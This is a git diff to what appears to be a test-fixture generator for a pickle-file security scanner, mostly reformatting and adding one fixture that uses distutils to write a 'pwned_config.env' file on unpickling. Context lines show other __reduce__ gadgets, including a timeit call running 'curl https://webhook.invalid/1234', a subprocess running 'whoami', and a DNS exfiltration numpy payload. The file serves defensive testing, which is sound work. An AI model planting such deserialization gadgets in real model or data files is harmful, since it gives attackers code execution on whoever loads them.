@@ -40,12 +40,14 @@ class Malicious3:
 class Malicious4:
     def __reduce__(self):
         import requests
+
         return requests.get, ("https://github.com",)
 
 
 class Malicious5:
     def __reduce__(self):
         import aiohttp
+
         return aiohttp.ClientSession, tuple()
 
 
@@ -72,6 +74,7 @@ class Malicious13:
 class Malicious14:
     def __reduce__(self):
         import runpy
+
         return runpy._run_code, ("print('456')",)
 
 
@@ -132,6 +135,7 @@ class Malicious20:
 class Malicious21:
     def __reduce__(self):
         import timeit
+
         return timeit.timeit, (
             "",
             'import os; os.system("curl https://webhook.invalid/1234")',
@@ -308,11 +312,17 @@ def reduce_GHSA_q77w_mwjj_7mqx():
     return _UnixSubprocessTransport._start, ({}, "whoami", True, None, None, None, 0)
 
 
+def reduce_GHSA_m273_6v24_x4m4():
+    import distutils.file_util
+
+    return distutils.file_util.write_file, ("pwned_config.env", ["malicious content"])
+
+
 def initialize_pickle_file(path: str, obj: Any, version: int):
     if os.path.exists(path):
         print(f"File {path} already exists, skipping initialization.")
         return
-    
+
     with open(path, "wb") as file:
         pickle.dump(obj, file, protocol=version)
     print(f"Initialized file {path}.")
@@ -337,7 +347,7 @@ def initialize_data_file(path: str, data: bytes):
     if os.path.exists(path):
         print(f"File {path} already exists, skipping initialization.")
         return
-    
+
     with open(path, "wb") as file:
         file.write(data)
     print(f"Initialized file {path}.")
@@ -353,6 +363,7 @@ def initialize_7z_file(archive_path: str, file_name: str):
         pickle.dump(Malicious1(), f, protocol=4)
 
     import py7zr
+
     with py7zr.SevenZipFile(archive_path, "w") as archive:
         archive.write(file_path, file_name)
     print(f"Initialized file {archive_path}.")
@@ -364,11 +375,11 @@ def initialize_zip_file(path: str, file_name: str, data: bytes):
     if os.path.exists(path):
         print(f"File {path} already exists, skipping initialization.")
         return
-    
+
     with zipfile.ZipFile(path, "w") as zip:
         zip.writestr(file_name, data)
     print(f"Initialized file {path}.")
-    
+
 
 def initialize_corrupt_zip_file_central_directory(path: str, file_name: str, data: bytes):
     if os.path.exists(path):
@@ -394,7 +405,7 @@ def initialize_corrupt_zip_file_crc(path: str, file_name: str, data: bytes):
     if os.path.exists(path):
         print(f"File {path} already exists, skipping initialization.")
         return
-    
+
     with io.BytesIO() as buffer:
         with zipfile.ZipFile(buffer, "w") as zip:
             zip.writestr(file_name, data)
@@ -728,6 +739,7 @@ def initialize_pickle_files():
     initialize_pickle_file_from_reduce("GHSA-49gj-c84q-6qm9.pkl", reduce_GHSA_49gj_c84q_6qm9)
     initialize_pickle_file_from_reduce("GHSA-q77w-mwjj-7mqx.pkl", reduce_GHSA_q77w_mwjj_7mqx)
     initialize_pickle_file_from_reduce("GHSA-jgw4-cr84-mqxg.bin", reduce_GHSA_q77w_mwjj_7mqx)
+    initialize_pickle_file_from_reduce("GHSA-m273-6v24-x4m4.pkl", reduce_GHSA_m273_6v24_x4m4)
 
 
 def initialize_numpy_files():
@@ -790,6 +802,7 @@ def initialize_numpy_files():
 
         # To load attack: np.load("dns_exfiltration.npy", encoding="latin1", fix_imports=True, allow_pickle=True)
         np.save(path, np.array([DNSLogPayload()], dtype=object), allow_pickle=True)
+
 
 if __name__ == "__main__":
     initialize_pickle_files()
